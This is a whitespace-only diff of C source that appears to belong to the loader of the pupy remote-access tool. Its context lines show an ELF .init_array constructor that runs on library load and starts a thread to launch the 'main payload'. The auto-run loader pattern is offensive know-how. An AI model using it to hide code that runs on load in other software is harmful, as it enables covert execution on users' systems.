@@ -25,9 +25,9 @@ thread_start(void *arg) {
      * sleep is better then nothing.
      */
 
-	dfprint(stderr, "Launch dedicated thread\n");
+    dfprint(stderr, "Launch dedicated thread\n");
 
-	sleep(1);
+    sleep(1);
 
 #if defined(Linux) && defined(WIP_LMID)
     /*
@@ -50,7 +50,7 @@ thread_start(void *arg) {
     }
 #endif
 
-	dfprint(stderr, "Starting main payload\n");
+    dfprint(stderr, "Starting main payload\n");
     mainThread(__argc, __argv, true);
     return NULL;
 }
@@ -90,8 +90,8 @@ __on_exit(int status, void *data) {
 
 static void
 _pupy_main(int argc, char* argv[], char* envp[]) {
-	dfprint(stderr, "pupy loader ctor called\n");
-	dfprint(stderr, "fill_argv called: %d/%p/%p\n", argc, argv, envp);
+    dfprint(stderr, "pupy loader ctor called\n");
+    dfprint(stderr, "fill_argv called: %d/%p/%p\n", argc, argv, envp);
 #ifdef DEBUG
     int i;
     for (i=0; i<argc; i++) {
@@ -148,7 +148,7 @@ _pupy_main(int argc, char* argv[], char* envp[]) {
             &thread_id, &attr,
             thread_start, NULL);
 
-	dfprint(stderr, "init_array completed\n");
+    dfprint(stderr, "init_array completed\n");
 }
 
 __attribute__((section(".init_array"))) void (* pupy_main)(int, char*[], char*[]) = _pupy_main;
